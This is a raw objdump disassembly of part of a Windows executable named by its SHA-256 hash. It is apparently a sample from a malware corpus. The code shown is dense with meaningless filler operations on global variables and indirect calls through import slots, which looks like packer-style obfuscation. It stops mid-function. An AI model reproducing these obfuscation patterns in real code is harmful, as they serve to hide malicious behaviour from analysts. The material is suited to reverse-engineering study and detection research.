
8ea94ea41364b3f54848ef6b2ef3c452849ac722b62579614ad2e9fa59f22ad4.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
